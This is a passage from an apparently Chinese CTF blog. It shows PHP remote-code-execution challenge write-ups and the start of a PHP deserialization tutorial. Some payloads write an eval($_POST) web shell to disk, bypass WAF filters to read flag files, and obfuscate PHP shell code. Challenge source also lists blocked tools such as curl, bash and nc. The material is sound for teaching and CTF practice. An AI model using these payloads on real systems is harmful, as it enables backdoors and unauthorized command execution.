class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$____</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>以post的形式写一个一句话：__=system&amp;_=echo &quot;&lt;?php eval($_POST[&#39;pperk&#39;]);?&gt;&quot;&gt;pperk.php</code></pre><p>蚁剑连接，也是第一次进windows的后台，哈哈哈！！！</p><p><img src="/2020/04/30/best-rce/2.png" alt="蚁剑连接"></p><h3 id="3-1-2-你取吧（36D）"><a href="#3-1-2-你取吧（36D）" class="headerlink" title="3.1.2  你取吧（36D）"></a>3.1.2  你取吧（36D）</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=hhh.php');</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">,</span><span class="token string">'\~'</span><span class="token punctuation">,</span><span class="token string">'\^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blacklisted</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blacklisted</span> <span class="token punctuation">.</span> <span class="token string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"echo($code);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 先把前面的<code>echo()</code>给闭合了，然后上Payload之后用<code>//</code>再把后面的给注释了掉，最后POST提交<code>_=system(&#39;cat /flag&#39;);</code>即可 </p><pre><code>?code=&quot; &quot;);$_=[];$_=@&quot;$_&quotcode></pre><h2 id="3-2-绕过waf"><a href="#3-2-绕过waf" class="headerlink" title="3.2. 绕过waf"></a>3.2. 绕过waf</h2><h3 id="3-2-1-36d—CTFShow"><a href="#3-2-1-36d—CTFShow" class="headerlink" title="3.2.1  36d—CTFShow"></a>3.2.1  36d—CTFShow</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"more"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tail"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"less"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tac"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"sort"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"nl"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/['\*\"[?]/"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'非预期修复*2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有过滤反斜杠，所以用反斜杠绕过waf，用&lt;代替空格，本题flag在flag.php，所以payload如下：</p><pre><code>ca\t&lt;flag.ph\p也可以：rev&lt;flag.ph\p|rev</code></pre><h2 id="3-3-绝对路径调用shell命令"><a href="#3-3-绝对路径调用shell命令" class="headerlink" title="3.3  绝对路径调用shell命令"></a>3.3  绝对路径调用shell命令</h2><h3 id="3-3-1-FBCTF2019-RCEService"><a href="#3-3-1-FBCTF2019-RCEService" class="headerlink" title="3.3.1  [FBCTF2019]RCEService"></a>3.3.1  [FBCTF2019]RCEService</h3><p><strong>考点：绝对路径调用shell命令 + 绕过preg_match</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">'Invalid input'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><strong>1、</strong>巧用命令注入的N种方式</p><p><a href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/?nsukey=cuhulJXlnsZXm26jcGfSU8uPQuyj9lHy6JgzI%2BHhWH1nSmTpihzzdItxZ7N1B0TTCZQxyFcmPSwDU0uGz4FXL8FpXdDuln1pncMlPJwcUBecvaQyvnS6cP2OUvZa6shJUIj%2FiE0H0ebV%2FBVPBUy%2BjN49HZp3VWB3QYmn2UuB5bfX9qw7WDjN7ABJb91GoDELgMcQig8qL%2FlsOWoTbHw30w%3D%3D#%E8%AF%AD%E6%B3%95" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/?nsukey=cuhulJXlnsZXm26jcGfSU8uPQuyj9lHy6JgzI%2BHhWH1nSmTpihzzdItxZ7N1B0TTCZQxyFcmPSwDU0uGz4FXL8FpXdDuln1pncMlPJwcUBecvaQyvnS6cP2OUvZa6shJUIj%2FiE0H0ebV%2FBVPBUy%2BjN49HZp3VWB3QYmn2UuB5bfX9qw7WDjN7ABJb91GoDELgMcQig8qL%2FlsOWoTbHw30w%3D%3D#%E8%AF%AD%E6%B3%95</a></p><p><strong>2、</strong>命令注入各种骚姿势</p><p><a href="https://wulidecade.cn/2019/02/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%AA%9A%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://wulidecade.cn/2019/02/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%AA%9A%E5%A7%BF%E5%8A%BF/</a></p><p><strong>3、</strong>Linux下几种常见的反弹shell方式</p><p><a href="https://www.jianshu.com/p/9456473a0a14" target="_blank" rel="noopener">https://www.jianshu.com/p/9456473a0a14</a></p><p><strong>4、</strong>利用ViewState在ASP.NET中实现反序列化RCE                </p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652476049&amp;idx=1&amp;sn=c695ef1e19eee8762430f149ecd6c043&amp;chksm=f2583122c52fb8347b6c7ca627446fce78a9df3c905ed923d39e02851936fe8b0817976bcba3&amp;token=1835870080&amp;lang=zh_CN#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652476049&amp;idx=1&amp;sn=c695ef1e19eee8762430f149ecd6c043&amp;chksm=f2583122c52fb8347b6c7ca627446fce78a9df3c905ed923d39e02851936fe8b0817976bcba3&amp;token=1835870080&amp;lang=zh_CN#rd</a></p><p><strong>5、</strong>从一道CTF的非预期解看PHP反斜杠匹配问题  <a href="https://blog.csdn.net/qq_43147039/article/details/105484384" target="_blank" rel="noopener">https://blog.csdn.net/qq_43147039/article/details/105484384</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF_WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>best_phpserialize</title>
      <link href="/2020/04/28/best-phpserialize/"/>
      <url>/2020/04/28/best-phpserialize/</url>
      
        <content type="html"><![CDATA[<h1 id="1-序列化-amp-反序列化入门"><a href="#1-序列化-amp-反序列化入门" class="headerlink" title="1. 序列化&amp;反序列化入门"></a>1. 序列化&amp;反序列化入门</h1><h2 id="1-1-入门基础知识"><a href="#1-1-入门基础知识" class="headerlink" title="1.1 入门基础知识"></a>1.1 入门基础知识</h2><h3 id="1-1-1-demo1-序列化"><a href="#1-1-1-demo1-序列化" class="headerlink" title="1.1.1 demo1 序列化"></a>1.1.1 demo1 序列化</h3><p>序列化：利用serialize()函数将一个对象转换为字符串形式</p><p>基本格式：类型:长度:值</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'Te1t'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">'18'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">'male'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/1.png" alt="序列化"></p><h3 id="1-1-2-demo2-反序列化"><a href="#1-1-2-demo2-反序列化" class="headerlink" title="1.1.2 demo2 反序列化"></a>1.1.2 demo2 反序列化</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'Te1t'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">'18'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">'male'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/2.png" alt="反序列化"></p><h3 id="1-1-3-对象属性"><a href="#1-1-3-对象属性" class="headerlink" title="1.1.3 对象属性"></a>1.1.3 对象属性</h3><p>private权限属性名:正常<br>private权限属性名: %00类名%00属性名，且属性名长度改变<br>protected权限属性名: %00*%00属性名，且属性名长度改变</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">'Te1t'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string">'18'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$sex</span> <span class="token operator">=</span> <span class="token string">'male'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'./flag.txt'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/3.png" alt="对象属性"></p><h4 id="1-1-3-1-S和s"><a href="#1-1-3-1-S和s" class="headerlink" title="1.1.3.1  S和s"></a>1.1.3.1  S和s</h4><p>PHP序列化的时候，protected和private变量会引入不可见字符\x00，输出和复制的时候可能会遗失这些信息，导致反序列化的时候出错。</p><p>private属性序列化的时候会引入两个\x00，注意这两个\x00就是ascii码为0的字符。这个字符显示和输出可能看不到，甚至导致截断，但在url编码后可以看得很清楚，就是%00。</p><p><img src="/2020/04/28/best-phpserialize/17.png" alt="php_serialize"></p><p>此时，为了更方便进行反序列化payload的传输和显示，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示。</p><pre class="line-numbers language-php"><code class="language-php"><span 